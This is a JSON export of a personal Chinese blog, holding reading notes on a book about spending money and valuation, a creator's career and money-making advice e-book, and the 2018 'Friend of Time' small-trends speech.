{"meta":{"title":"Leooel","subtitle":"勇敢做自己","description":null,"author":"Leooel","url":"http://leo.dropsec.xyz"},"pages":[{"title":"It's just a photo album","date":"2017-08-19T10:14:00.000Z","updated":"2019-02-10T15:02:44.243Z","comments":true,"path":"album/index.html","permalink":"http://leo.dropsec.xyz/album/index.html","excerpt":"","text":""},{"title":"tags","date":"2017-07-07T10:13:07.000Z","updated":"2019-02-10T13:43:01.449Z","comments":true,"path":"tags/index.html","permalink":"http://leo.dropsec.xyz/tags/index.html","excerpt":"","text":"所有标签： | 最大的幸福,莫过于我看你的时候,你也在看着我 | 洋流 · 读书笔记 数据结构与算法 · 计算机系统 · 技术 · 项目 | 嘿,此时你正看着我,而Leo也静静看着你呢… |"}],"posts":[{"title":"学会花钱 笔记","slug":"学会花钱-笔记","date":"2019-02-09T06:38:16.000Z","updated":"2019-02-10T06:19:04.852Z","comments":true,"path":"2019/02/09/学会花钱-笔记/","link":"","permalink":"http://leo.dropsec.xyz/2019/02/09/学会花钱-笔记/","excerpt":"你能正确理解「世界上始终只有货币价值，而没有个人的存在价值」这句话吗？","text":"你能正确理解「世界上始终只有货币价值，而没有个人的存在价值」这句话吗？ 序言 你花钱明智吗？巧妙地花一笔钱和挣到这笔钱一样困难。 ——比尔·盖茨 回顾过去，会发现，人们关于金钱使用方法的技术、知识积累，以及经验教训的共享，迟迟没有进展。 笔者认为，人类之所以还没有熟悉“使用钱的方法”，是因为不习惯将金钱作为价值尺度和贮藏手段。首先，我们不知道合理推断货币价值的方法。其次，我们还没有确立起应对不确定性的正确方法。 第一章 一流投资家的判断和主妇相同——价值和价格 一个人的钱包可以分为三份：消费、投资、投机。 在金融的世界里，将来产生的钱被称为现金流量。某项投资能带来多少货币价值，是基于其将来产生的现金流量的数额。 货币价值 消费钱包中的商品或服务，它们的价值由效用（个人的满足程度）决定；投资钱包中的商品或服务，它们的价值由将来创造出的现金流量决定；投机钱包中的商品或服务，除了赌博的价值暂且认为由其将来产生的分红决定，还包含贵金属及绘画作品等不会产生现金流量的商品。 价格如何确定？ 消费钱包中的商品或服务的价格，是综合考虑效用（个人的满足程度）及生产成本之后确定的。 美术作品、黑珍珠、高级汽车等，一旦成为很棒的东西，它们的价值与价格就会逐渐被常理所规定。即本末倒置的定价方法，价格决定价值。 第二章 不懂房地产，也能三分钟估算房子的价值——价值和现金流量 收益现值法：通过将来产生的现金流量推导出物品价值的估算方法（DCF，Discounted Cash Flow)。 今天的100元比明天的100元更值钱 公寓出租100年，其价值并不会更大。因为距离现在的时间点越远，折现率越高，现金流量折现过程中打折扣的金额越多。越是遥远的未来，现金流量的价值越是无限趋近于零，所以利用现金流量求出的现值，无论时间是30年、100年还是无限期，结果并不会有太大差别。 折现率等于投资回报率（收益率）。区别在于投资方是从不确定性（风险）的角度来看，还是从投资回报（收益率）的角度来看。 净现值法：通过比较售价和利用DCF法得出的现值来判断是否进行投资的方法。 为什么东京中城的卡尔顿酒店里的一杯咖啡会卖到1800日元？ 正确答案：因为东京中城是人气区，即使一杯咖啡1800日元，也会有人来买。（因为现金流量创造力强，所以价值会上升。金融界人们常常从现金流量出发考虑问题） 第三章 工龄资历是新社员的希望——时间及其影响 后天习得的知识、经验，会在无意识中作用于人类大脑，这就叫作认知。 感知时间：大脑的前额叶会依据包含五感在内的各种外部刺激、信息，以及迄今为止学到的知识、经验来“认知”时间。 雅内法则：人感知的时间的长短，和自己的年龄成反比。 我们之所以觉得时间过的越来越快，是因为上了年纪之后，动作和思考的速度变慢，单位时间的工作量因此下降。 也有人认为，年纪越大越觉得时间过的快，是因为感受到的时间和累积的经验量成反比。 效用和时间的关系 知道自己的预期寿命是判断投资还是消费的时间因素之一。从平均预期寿命的角度考虑折现率（利率），时间越长，折现率越高。 将来的自己和现在的自己是完全不同的人，对于效用的感受也会不同。 现在是最重要的。也就是说，与现在间隔时间较短，人们感受到的效用会大幅减少；但是如果与现在间隔的时间较长，效用减少的幅度会渐趋平缓。 将人们对于时间和效用的感知综合起来看，就会发现：一般情况下，人们倾向于重视现在，未来的现金流量带来的效用会逐渐减少。 第四章 钱包里的“歪曲硬币”——概率的错觉我们无法想象世界上还会发生什么，却总是在事情发生前，过分武断。 我们不可能时刻根据合理的判断来购物的原因 我们还没找到一个合理的方法，能够将时间因素结合起来判断。 我们的钱包里时常会出现迷惑我们的“歪曲硬币”（概率错觉）。 人们不擅长概率，有一种解释是因为现实中的事实独一无二。 人们会有一种倾向，即将偶然当作命运，以此来发掘某种特殊的含义。 概率论可以说是一门“神之视角”的学问。每个人在神看来，都只不过是众多样本中的一个。但是对我们自己来说，很难客观地将自己当作样本对待。 关于概率的错觉根深蒂固 三门问题 人们总是选择遗忘先验概率 回归平均：当上一次的数据和平均值偏差较大时，下一次的数据会比上一次更接近平均值。 赌徒谬误：连续扔五次硬币都是正面朝上的时候，我们就会认为第六次会是背面朝上。也叫做小数定律。 赌徒谬误是人们误解回归平均的原因之一。 在我们面对的概率陷阱中，赌徒谬误是最具魅力的一个。 与概率一样，计算平均数的方法不同、计算时所选择的标准不同，期望值的优劣也会不同。大多数人注意不到这一点。 第五章 明知不可能还一直买彩票的理由——判断的习惯 当现金流量为永续年金时，可以用现金流量的数额除以折现率得到现金流量的现值。 麻烦的是如“把握时间的方法”、“歪曲硬币”（缺乏概率和平均数相关的知识）等因素会对这一公式产生干扰。 而且，人类还有着“明知不可以却偏偏要去做”这种与生俱来的“习惯”，它也会影响我们做出合理的判断。这里所说的习惯是指受到人类心理影响的行动，有一门研究它的学科，叫作行为经济学。 人们对于较低的概率会反应过度，对于较高的概率则会反应不足。 人们感受到的概率和数学上追求的理论值完全不同。人们感受到的主观概率和理论值的差，与事件发生后造成的大小有关。 概率论原本是神之视角的理论，但是如果自己是样本中的一个，思考问题时就会失去“神之视角”，变得以自我为中心。因为自己就是人生的主角。 边际效用递减规律：我们感受到的满足程度的变化量，随着获利或损失的增加而递减。 损失规避：即使收益和损失相同，增加损失的“不满足程度”也要比怎加收益的“满足程度”更大。表示我们通常对于损失反应过度，有想要规避损失的倾向。同时，每个人对于不确定性（风险）的接受程度不同。 人的习惯之一：满足程度受金钱变化的影响，而不是受总额的影响。 人们从原始时期开始，对于变化的反应就很敏感。人们的动态视力非常强，却注意不到逐渐发生变化的风景。 “只瞄准资产在30亿日元以上的人”，这是从事私人银行业务的铁律。（无形门槛后有惊喜） 理解这个客户群体的需求，并且只将符合的理财产品销售给他们。 人越有钱，对资产减少的恐惧就越大于资产增加时的喜悦。这就是为什么他们的需求是“资产不增加也可以，只希望不要减少”。 他们正是因为能够准确掌握投资带来的不确定性才累积了这么多的资产。他们始终如一，不渡危桥，对于稳健的投资十分满足。 人类过于看重特定信息的习惯。 如果只看结果，只接受对自己有利的数据，就会犯错误。 第六章 拉面馆和法国餐馆，哪一个价值更高——风险和回报 风险：金融理论中的“风险”，指的是不确定性。不确定性的含义是“不确定预想的事件是否会发生”，而不是“危险的事情、不喜欢的事情会发生的可能性”。 长期来看，低风险低收益的股票比高风险高收益的股票投资价值更高。（来比正方形面积理论，像正方形一样到达协调的状态，即没有偏差的状态，效率更高） $ 夏普比率 = \\frac{(预期收益率 - 无风险利率)}{风险(标准差)} $ 预期收益率减去无风险利率得到的值称作“超额收益率”。 这里的无风险收益率指的是国债的利率。 夏普比率值越大，说明风险越低，收益率越高。夏普比率高的股票是具有魅力的投资对象。 投资重要的是把握一年或更长时间之后自己的资产会增加多少、总资产的偏差是何种程度，而不是自己投资的股票平均每天收益增加多少、收益率的偏差是多少。 控制风险的方法 资产组合、期权 资产组合：不改变收益率而使风险减小的方法。 期权：针对某种标的资产，在事先规定好的未来某一特定的日期或一段时间内，按照一定的比率或价格（执行比率、执行价格）交易的权力。 股票期权制度：授予公司员工按照提前确定的价格购买本公司股票的权力。它是激发公司员工干劲的一种手段。 权利金：提前支付的期权价格。当我们无法像资产组合那样同时分散投资多项资产时，期权交易就是非常有效的避险手段。 风险对冲：为了规避期权交易的风险而购买股票的行为。影响期权价格最大的因素就是一年之后股价的偏差，期权术语中，这一年间股价的偏差称为“波动率”。 股票期权的价值来自于股价的偏差（波动率），和公司的股价预计会不会上涨没有关系。 有偏差的股票，作为期权的价值才会高。问题公司的期权比优质企业的期权更有价值。 偏差：偏差并不是股票变动的差价，而是指一定时间内，每日收益和平均收益的差。（即从起点到终点，绕了多远的路） 支付保证金的习惯，是买卖双方互相买卖期权的一种特殊交易。 第七章 蚂蚁和蟋蟀的生活，谁的生活更好——绕道的价值 现金不会产生价值，只有流动起来才有意义。 人、物、钱，是按照现金流量创造力的强弱排列的。在金融界里，把人的价值看得很重。 教育的投资是高效的。人是能够创造现金流量的重要资产，所以对人的投资，回报率很高。 我们要提升自己——保持身体健康，努力提升个人能力，尽量使自己创造现金流量的能力和享受经历的能力维持更长的时间。 我们没有必要对未来的不确定性反应过度。重要的是：我们要充分认识到自己人生每个阶段应该做什么、做什么效用最高，然后最大限度的活在当下。 不会背叛的财产只有自己。年轻的时候最大限度的投资自己，三四十岁的时候使现金流量最大化。 唯吾知足。自利利他。 “少年哟，要胸怀大志”，这份大志就是勇敢挑战不确定性的精神。人生的价值和期权一样，都是由起点到终点期间绕了多少远路决定的。 获得金钱的目的，是为了摆脱金钱的束缚，获取自由。","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://leo.dropsec.xyz/tags/读书笔记/"}]},{"title":"「帅张和他的朋友们」第二期精华电子书 笔记","slug":"「帅张和他的朋友们」第二期精华电子书-笔记","date":"2019-02-05T11:47:17.000Z","updated":"2019-02-10T06:21:41.436Z","comments":true,"path":"2019/02/05/「帅张和他的朋友们」第二期精华电子书-笔记/","link":"","permalink":"http://leo.dropsec.xyz/2019/02/05/「帅张和他的朋友们」第二期精华电子书-笔记/","excerpt":"仗，要不要打？什么情况下该打？ 这场仗能打赢，再去打。","text":"仗，要不要打？什么情况下该打？ 这场仗能打赢，再去打。 仗，要不要打？什么情况下该打？ 先胜而后求战 商场如战场，商业上很多重要的决策，绝大部分在做之前都没想清楚，或者没有自信，想着边做边尝试，在尝试中寻找答案，边做边尝试是对的，但是在做之前没有充分的准备，没有任何把握，在做之前，很多时候就决定了结局 既然都是白纸，后来我选择了当初刚起步不久的移动开发作为主战场，选择了 Android 方向，这个新兴的方向，大家都处于同一起跑线，我赢的把握更大，现在来看，真是最正确的决定 但凡重大的决定，不要想着在尝试中去找答案，对于小事情这样是可以的，但是一些人生的重大决定是没有尝试的机会的，想尽一切办法想把仗打赢的，是最难的，你最该做的，是在一开始选择前，这场仗能打赢，再去打 所以我一直认为互联网时代是我们当下最好的时代，是普通人最有可能通过互联网来逆袭的时代，如果在以前，根本不可能 作为普通人的我们，先让自己有一个优势，也就是所谓的绝活，如果你有一个绝活，要想办法让通过这个绝活让更多人知道你，这样你才能创造比打工翻多少倍的价值，微博、知乎、直播、公众号、抖音、快手等都是类比于以往电视的平台，对机会敏感的人会成为上面的创作者与生产者，进而通过这样的渠道提升自己的影响力，连接更多人，对机会不敏感的人，只会成为围观者与消费者，成为那一批整天刷微博、抖音的普通用户而已 很多人总说微信上的机会是不是已经晚了，其实在我看来，微信上的商业机会才刚开始，可能不久的将来，微信将重构新的商业结构，在微信生态内，一定会孕育一大批牛逼的公司出来 当所有人都在凑热闹的时候，我在发掘这背后的商业价值，生活中处处皆学问，有人的地方，就有商业 你以后会有钱的，而且一定是 比你厉害的人，他们说的、做的虽然不一定都对，但是格局一定不会错 提升信息筛选与辨别的能力：质疑、对比、验证 比你厉害的人，大多数在各个领域都比你厉害，当你没法判断的时候，宁愿相信他们的判断 提升学习效率的能力 如何提升学习效率呢？ 多阅读，阅读任何时候都是学习的最佳方式。经常阅读的人，对知识与文字的理解接受能力比不怎么阅读的人高的多 借助一切可能的资源节省自己的时间，很多人对玩游戏、吃喝可愿意花钱了，但是一说要花钱学习，一毛不拔。但是我得提醒大家，花钱学习，不是因为你花钱可以学的好，而是因为你花钱能学的快，能帮你提升效率，那就去花。很多人总以为花钱学习，就能有不一样的知识与资源呢，互联网时代，什么资源你找不到？你想学什么都可以找到一堆免费的资源，但是能够节省你的时间，这钱就花的值 信息筛选与辨别能力，和提升学习效率的能力，这两个能力如果你掌握了，其实很容易跟同龄人逐渐拉开差距。有意识的去培养这两种能力 前面有球友问我 20 岁的时候在做什么？到现在为止张哥在坚持什么事儿或者几件事使自己成长的？ 一个是把事情做到极致，另一个是不服输 我有个习惯，我会经常复盘，小到每一周我都会单独抽个时间思考下，这周做了什么，哪些做的不好的，哪些该做没去做的，这种复盘我自认为对自己非常有用，它可以反思自己，勉励自己 他说在腾讯内部像他这样的产品经理特别多，但是开发资源有限，流程很多，他做了三年产品，看起来从结果来看，数据还都可以，但是他心里很清楚，他其实在产品上的进步与贡献很少，绝大部分成就都是因为腾讯自身品牌与流量的加成，外人看来光鲜，但是他自己觉得进步很少，所以萌生了留学的想法 认清自己。充分发挥你的优势，积累影响力，让行业内知道你，让更多的人知道你，不管是单纯技术的积累还是一些 title，不管是在中国还是美国，只要能让自己更有影响力，那就去做，影响力才是一个长期的，有很大价值的东西，有了影响力，不管以后跳槽打工，还是自己创业，都比别人容易的多的多 但是写作分享这个事，可积累性就很强了，写的越多，自己的写作能力与表达能力得到了锻炼，读者数量的可积累性更是强 不过当时的认知没想到影响力这个点，但是现在来看，影响力的积累才是最重要的，影响力越来越大，价值才是最大的 接着，他又问了我这一路过来，如何应对那些质疑你的人？ 我好像就总结了一句，你做事，是冲着那些认可你的人去做的，而不是冲着那些不认可你的人而做事 一些人只愿相信他们愿意相信的事 我对幽默的理解是，我一直觉得跟普通人打交道，建立在别人痛苦、揭别人短的前提上，不是真的幽默，比如，跟别人聊天，拿别人的个头、脱发取笑等，这种不是真正的幽默，只会让人反感 真正的幽默是让人愉悦的幽默，比如拿舔狗举例，我说，你们都做我的舔狗吧，这种就不是很幽默，会让你们不舒服，但是我说我是 Fenng 大和曹大的舔狗，这种建立在自黑的基础上才比较幽默 我记得之前有人问我怎么变得牛逼？ 第一步就是先要找到牛逼的人，并且学会信任比你牛逼的人的观点，牛逼的人是完美的么？当然不，但是你要做的是从牛逼的人身上学习优点，这就够了，牛逼的人身上当然有缺点，但是人家身上的缺点自然自己知道，不需要你指出来，更不需要你来帮他改变 技术思维多是以自我为中心的，而产品思维是用户驱动的 首先大家要有一个意识，everything is product！即，万物皆产品 我高效学习的法宝是，钱堆出来的 他们在解决问题的时候，第一反应是用钱这种人人都喜欢的工具来解决 一定要多挣钱，有钱跟没钱不是财富的差距，而是各方面资源的差距会越来越大 所以，以前我就说，穷人思维和富人的思维是，穷人花 10 块，总奢望得到 100 块的价值，而富人花 1w 块，只求得到 1000 块的价值就够了，但是即便如此，富人可以轻易获取 1000 块的资源，而穷人即便费劲九牛二虎之力得到 100 块的价值也差距很大 产品策划在选择用户的时候，往往会有两个方向。 一是解决大部分用户的小问题，二是解决小部分人的大问题。 这种用户的选择非常有学问，往往，在一个时代的早期红利时期，务必要选择第一种，就是针对大部分人群的小问题，这样你的想象空间与发展方向才够大。而在红利期没有的时候，在市场一片红海的时候，这个时候新的产品要选择第二种，针对单一领域的小众用户，解决这一小部分人的大问题，会是一个不错的思路 来，衣食住行是人类最原始、最恒定的 说到人性，什么是人性呢？贪、嗔、痴、爱美、攀比、贪小便宜、虚荣、炫耀等等都属于人性。这些人性最深处的东西，如果你能把握住，你的产品就很难被离开 但需求又分痛点和爽点，痛点往往就是所谓的刚需 每一个领域都不是单一的，一些原则与思维是通用的，怕的不是你不知道，怕的是你原本知道，但是不会关联运用 重视个人件 重视鲸鱼客户 差异化竞争 其实我不是很喜欢性价比这个概念，我比较认同「贵就是好」的理念 利用风险最少的时机去学习一门技能，这是最划算不过的 你得相信，未来，你是越来越有钱的 未来你一定会有钱的 绝大部分人都缺乏一种特质，就是冒险精神，你可以去分析任何一位成功人士，是的，任何一位，无一不具备冒险精神，敢干，才有可能成功。这个世界是公平的，没有风险，只有回报的事，那根本轮不到你了，有风险不可怕，怕的是你看不到风险带来的机会 举个例子，拿我们看书来说，大部分人看书习惯从第一章第一节就开始看了，其实这是低效的，而我在拿到一本书的时候，一定先看这本书的目录，而且不是粗略的看，而是会仔仔细细的看，因为对于一本书来说，它的目录就是这本书的知识体系，通过书的目录，大概能知道这本书大概讲什么，每一章节是怎么组织的，之后我再根据目录，去挑选一些我认为对我当前工作学习有帮助的内容去看，而很少会从第一页去看 高效学习不是说我抓紧每一分每一秒都去学习，而是说我所有在学习的每一分每一秒都要有意义 知识学习本来就是用来应用的，来解决问题的，而我们却总是本末倒置！ 所以，本质上，只要你打工，其实你的价值是没有被充分发挥的，你是不是该想办法充分发挥你的价值？ 当第一个问题你实现后，通过写作，用文字把你的专业知识传达给需要的人，帮助后来者，写作 + 专业的结合，再加上互联网思维，把自己创造的价值传递给互联网上的目标用户，你就可以让你的价值最大化，这是做这件事的最底层的逻辑 可以看到，我考虑事情从来不是从短期出发的，不管是你的专业积累，还是写作的锻炼，还是影响力的积累，都是从长期来出发的。 时间很快，人生看似很长，其实过的很快，现在你们为自己的菜而烦恼，以后你们成为职场老手，在专业领域的积累成为大牛，是很快的事，但是等到了那一步你肯定又会遇上新的烦恼与挑战，做事情从长期出发，会让你的人生更有充分的准备 真的，从我接触过的一些不同层次的人群来说，反而是越高级别的人，越爱发朋友圈。比如投资人投资了什么好的项目，他要发朋友圈，向圈内人证明自己的投资能力，比如有的创业公司老板，公司取得了什么成绩与进展，发个朋友圈炫耀下，让一些潜在投资人关注到，比如你加班到很晚，解决了一个很难搞定的问题，事后不经意间发条朋友圈，你的领导就会觉得你是个靠谱、有责任心的人，说不定就因此升职加薪了 你的能力让别人知道，本身就是一种能力 「先胜而后战」的思维，但是如何更好的判断能否取胜呢？其中一个很重要的条件就是，要先正确的认识自己，客观的看待自己，有什么优势，有什么劣势，如果认清不了自己，那做对判断挺难的 永远不要以小概率事件来决策，永远不要把自己当成小概率事件的缔造者 能获取多大价值，取决于你是否有结合自身的情况有深入思考，取决于你个人的执行力到底怎么样，这点是决定每个人是否有很大改变最本质的区别 我做的一些决策，背后都是有合理的逻辑的 有很多人，看不起小钱，不愿意动手，这个就是传说中的眼高手低，殊不知每个大佬都是从赚小钱起来的 再比如我加各种大 V、大佬的朋友圈也是类似，我想进入到更高阶的圈子，提前熟悉理解他们圈子里的东西，获取更多的我很难接触到的信息，哪怕层次暂时不够，哪怕有些东西难以理解，但是这会驱动你进步，驱动你早点跟上他们的步伐 想赚大钱，那就必须先从赚小钱开始，任何人都是，没有谁能一步登天，赚小钱考验的是策略以及执行力，这些都是以后赚大钱必备的特质 销售跟编程一样，也是一种技能与本事，抬高编程，贬低销售，这是偏见，这是你格局决定的偏见，在我看来，销售能力丝毫不必任何能力低等，销售能力强的人，同样值得学习与尊敬 拿我之前给大家普及过一些赚钱的思路来说，我知道的就有不少人赚钱了，然而很多人是赚不到钱，本质上就在于执行，而执行最重要的一条，也是我今天想教给大家的： 你是否每一天都有进步 我坚持阅读，每一天的阅读，我感知不到每天的变化，但是我知道阅读是好的，积累下来，这就会开拓我的视野，引发我思维的升级 最后，想告诫大家，尤其是更多刚毕业或者工作没多久的年轻人，不要看不起每天不起眼的进步，请每天睡觉前想一想，今天是否学到点东西，今天是否有进步，只要保证每天都有进步，时间自会证明你自己的价值！ 赚钱不是罪过，赚钱是一个人综合能力的体现，赚钱这件事要正确对待，学会感受金钱的善意 认识牛人不会给你带来什么，我所取得的一些成绩全部是凭借个人能力做到的，人脉只会锦上添花，从来不会雪中送炭，今年结实了更多的人脉，进入了更高层的圈子，相信这些会在未来的发展中，起到锦上添花的作用的 圈子的价值在于扩充自己视野，优化自己思维，不然你永远处于你自己所在的圈子，你永远不知道这个真实的世界是什么样的？不同的圈子，可以给你带来不同的视野，你看待问题的眼光都会不一样","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://leo.dropsec.xyz/tags/读书笔记/"}]},{"title":"时间的朋友-小趋势-回顾笔记","slug":"时间的朋友-小趋势-回顾笔记","date":"2019-01-01T14:06:24.000Z","updated":"2019-02-05T13:27:11.001Z","comments":true,"path":"2019/01/01/时间的朋友-小趋势-回顾笔记/","link":"","permalink":"http://leo.dropsec.xyz/2019/01/01/时间的朋友-小趋势-回顾笔记/","excerpt":"有意瞄准，无意击发。","text":"有意瞄准，无意击发。 云吸猫 第一部分：开篇 比起普通人无法把控的大趋势，真正能给所有人带来机会，从细微处引发大变化的，恰恰是我们身边的各种 “小趋势”。 你有你的计划，世界另有计划。以前，变化可能只是生活的一部分；现在，变化可能成了生活本身。 其实并不是这一年故去的人特别多，而是我们这一代中国人，从40年前开始，才有机会知道很多人。 我们并不是在告别谁，我们是在告别自己的一部分。 2018年，他们的离去提醒我们：我们必须习惯，这个世界抽换掉一些我们喜欢的、熟悉的东西。 成年的滋味总是很复杂，熟悉的也许只能用来怀念，依赖的也许必须要放手。 跨年演讲进行到第四年，我们越来越想清楚了跨年演讲是为谁服务的：为做事的人服务。做事的人无所谓悲观还是乐观，我们只关心如何把事做好。 有些事情在做事的人面前，完全不难。 真实的世界里，并不存在抽象的两难选择。每时每刻，我们做事的人面对的就是一张时间表，就是这张时间表上具体的时间安排而已。 宏观是我们必须接受的，微观才是我们可以有所作为的。 ——查理·芒格 第二部分：小趋势 那些会导致变化的力量，往往都是来自其他领域，来自那些我们平时观测不到的因素。 过去世界是大河模型，而现在，我们可能有必要把世界理解成一组多米诺骨牌，它摆成什么样不知道。但是只要有一个小小的颤动，哪怕是一只路过的蚂蚁碰倒了一张牌，一个极小的趋势，那么抖动了一下，就推动了一个大一点的趋势，接着又会推动一个更大的趋势，经过一连串的连锁反应，等推到我们面前的时候，已经面目全非，而且还变成了个庞然大物。每一张牌倒下的时候，我们都很难预测，它会推倒什么？放大什么？又会消灭什么？最终的景象又是什么？ 小趋势的特点：第一，它小，所以很难察觉。第二，它不发生在我熟悉的领域里，它是通过一系列的连锁反应才滚动到我面前。 人类文明发展到我们今天看到的样子，在绝大多数情况下，都不是一个小变化越长越大，砰地一下，膨胀成了一个大变化。老天爷是个魔术师，是这个变化，引发了另一个变化，一层一层地传递过来的。 现在，我们就知道什么是“小趋势”了。它不是大趋势的小时候，它本身也未必能长成一个大趋势，它的威力是能启动连锁反应。 所以，现在我们可以给小趋势下一个相对准确的定义了。小趋势是啥？小趋势是影响趋势的趋势，带来改变的改变 如果你觉得，现在这局游戏不是你的游戏，没关系，别打盹，因为这局游戏是那些大佬的游戏，有可能产生的那个连锁反应会滚到你面前，改变你的游戏。上一个窗口虽然关闭了，没准属于你的窗口，正在打开。 在小趋势的逻辑里，我有一个坏消息和一个好消息要告诉你。坏消息是，每一趟班车停靠的时间都很短，而且看起来都像末班车。好消息是，真的没有末班车，车是一会儿一趟，越来越密。 小趋势的逻辑里，总有新机会，总有下一班。哪有末班车？ 而想借小趋势的人呢？没有一劳永逸的想法。他只是随时在做准备，把自己感知能力磨得锐利无比，随时等待、捕捉那个小趋势的信号的传来。 凡我赶不上的，我就做好准备，到未来等它。 第三部分：我能看到事实吗？ 所有趋势都起源于事实，想抓住小趋势，那就得能认清事实。那问题是，我们看得到事实吗？ 真相未必神秘，但很隐秘。 我们回到真相和感知之间的鸿沟，一边是人类拼命努力，扭曲事实；一边是世界拼命努力，隐藏自己。 我们经常对真相一无所知。 你们千万别把自己当主流，要对自己的趣味保持一种警醒和谦卑，不要动不动就以己度人。 在中国，再众所周知的事情，都起码有一个亿的人不知道，而大多数时候，是十个亿的人都不知道。 –沈帅波 为了看清事实，我们人类有一项本事，就是给自己发明了很多工具。问题是，工具发明越来越多，但这些工具到底是让我们离世界越来越近，还是越来越远呢？ 等号（=）的意思是，有些东西不重要。等号的一边是事实，一边是根据某种原则的抽象。真实世界的很多东西，被等号全丢掉了。 不抽象，我们就无法深入思考；不还原，我们就看不到本来面目。 –刘润 还原能力才是做事的人，逼近事实真相、把握小趋势最稀缺的能力。 制造业是我们构建一个真实的、良好社会的压舱石。 中国是什么？它是好多好多全世界最勤奋、最想通过努力改变命运的一群人组成的。 巴菲特有一个提醒：没有一个人可以靠做空自己的祖国成功。这不是在讲什么爱国主义，而是说每一个人的成功，都是在分享一个共同体的红利。我们一生的所有红利，其实都来自于这样一条经济增长曲线。 为了抓住小趋势，我能看到事实吗？能，如果你掌握多元思维模型。 一个人能同时保有全然相反的两种观念，还能正常行事，是第一流智慧的标志。 –菲茨杰拉德 第四部分：我能感知“非共识”吗？ 决定我们个体命运的，除了众所周知的大趋势，更是那种需要我们自己去主动发现的小趋势。 从被排斥到被承认，从脱离共识到再造共识。整个过程，才叫非共识。 在某一段时间里，大家觉得你的商业模式非常不靠谱，非常傻。在别人看不起、看不懂、觉得你不靠谱的这段时间，你有机会积累用户、试错，并且创造出一定的壁垒。紧接着，有人认可了。这段时间叫“傻瓜窗口”。 政治家罗斯福也有一句话：“你一心想领导人们前进，回头一看，跟着的人却一个都没有，真可怕呀。”伟大的政治家从来如此。从自己提出一个主张，到发现没人跟这个可怕的时刻，到众多的人追随，你成了领袖的这个时刻——这段时间窗口，也是非共识。 梁宁之所以说创新过程是一个“非共识”的过程，是想强调，穿破当下共识难，承受当下共识的压力更难。 我们必须要回到创新的现场，才能观察创新。才能感受到那种真实的艰难，和突破之后的震撼。每一项创新，在它诞生的那一瞬间，都好像是突然点亮了一盏灯，照亮了长夜。 任何在我出生时已经有的科技，都是稀松平常的世界本来秩序的一部分。任何在我15-35岁之间诞生的科技，都是将会改变世界的革命性产物。任何在我35岁之后诞生的科技，都是违反自然规律，要遭天谴的。–道格拉斯·亚当斯 非共识从来不反对什么，它只是把被忽略的东西呈现出来而已。 它们一直都在，明明白白。非共识，来源于更深处的共识。 世界上有很多创新，不是往前，不是走向从来没人去过的陌生地带，而恰恰是往回走。 达成非共识的过程，是一个“回到母体，强化母体”的过程。 古老的母体，在不同时代化身为不同的样子。我们每一个人要做的是，不断回到它、不断把这个时代最好最新的东西献给它、强化它。 我能感知“非共识”吗？这个问题的本质是，我们能创新吗？现在我们可以回答了：能，只要你有本事用最新的方法把那些古老的事情再做一遍。其实创新一直都存在一个稳定的路径，我在法学家刘晗老师的著作里就读到了这个路径：“若不进入传统，则无法添加新物。” 第五部分：我的时间够用吗？ 万维钢老师有一个判断：所谓信息过载，原因只有一个，你对环境的熟悉程度太低。而在熟悉的地方，你只会觉得新东西太少。 每个人都有一个计划，直到被一拳打到脸上。 –泰森 从今往后，对婚姻最好的祝福有一个词——“顶石婚”。 种一棵树最好的时间是十年前，其次就是现在。 这不是结束，甚至不是结束的开始，只是开始的结束。 –丘吉尔 所有能穿越时间的东西，就该坚守，因为人生太长了。所有会被时间过滤的，该翻篇就翻篇，因为人生太长了。 还有什么比人类从此以后活得那么长、拥有那么多时间更明显的小趋势吗？想抓住小趋势的人，请到这个新坐标里去找。 这其实不是什么深刻的洞察，这只是我们这一代人都要面临的事实。其实很多人已经在按照百岁人生的模式在行动了，只不过他们表现出来的、经常喊出来的是当下的情绪，但是在别人没看见的地方、默默发力的，全部是长期的安排。 你在朋友圈里又佛又丧，你在收藏夹里偷偷地积极向上。 第六部分：我的力量从哪里来？ 拼多多是人的逻辑。 –黄峥 赵大妈对于李大妈的信任，是说不清楚的，是数据暂时还计算不了的，但是李大妈说什么，赵大妈都信，而且直接信。这种信任是什么？是一种人对人非常直接的感知和判断。这个感知和判断，胜过千万条数据。 用一个产品六年前的老数据来衡量今天的质量。 用人的体验丈量世界：一个真实的人的真实反应，恰恰是我们最值得信赖的指标。 我们一方面相信，人工智能会是无比聪明和强大的工具。但是另一方面，别忘了我们自己身上藏着的感知能力，那份良知良能是大自然几十亿年进化出来的极其灵敏的工具。这玩意好用得不得了，它一直都在。 今天讲这个信用飞轮的逻辑，只想证明一点：这个世界绝不会只变成机器的世界、算法的世界、代码的世界。这个世界在很多场景下，完全呈现为一个人推动人的世界。 用人的体验丈量世界，启动你的信用飞轮，你就会有力量。 第七部分：时间愿意和我做朋友吗？ 只要你能足够地强大，跳出时间给你设置的陷阱，你就能成为时间的朋友。 只有长期主义者，才能成为时间的朋友。 长期主义不仅要坚持你想做的事情，而且不能中断你在做的事情，还要持续地不被诱惑。一旦中断，前功尽弃。 小趋势的信号即使再微弱，只要一旦被识别出来，长期主义就能把它放大。长期主义是微弱信号的放大器。 任何一个人，不管你的力量强弱，放眼于足够长的时间，你都可以通过长期主义这种行为模式，成为时间的朋友。 普通人的努力，在长期主义的复利下，会积累成奇迹。时间帮助了他们，他们成为了时间的朋友。 一千年有一千年的干法，一个月有一个月的干法。 一个人的成就，来自一套核心算法乘以大量重复动作的平方。 虽然这个世界充满了不确定性，但是你可以用自己的超级确定性，来对冲外界的不确定。 这个世界到处充满了算法，算法每时每刻都在试探你、判断你、诱惑你、套路你。这个世界好像很危险。为什么算法很危险呢？因为算法是一个整体，我们作为一个人，被算法解体了，变成了碎片化的数据。 作为个体，我们貌似无力反抗。但是，我们手里还扣着一张王牌。我们为什么命中注定只能被碾压为碎片，只能成为被利用的数据呢？我们为什么不能反过来，成为一个整体性的算法，来整合外部世界呢？我们也可以是算法，外部世界也可以是数据。 这个世界其实正在发生一场博弈。你是数据？还是算法？ –吴伯凡 第八部分：尾声 2019年还是来了。天高地广，世界又是一个新的样子。不管2018年我们过得怎样，我们都有机会重来，也必须重来。 变化来了怎么办？整场下来，你明白了吧。一个做事的人，怎么会怕变化呢？我是巴不得变化到来的，如果这个世界没变化，还有什么机会轮得着我吗？ 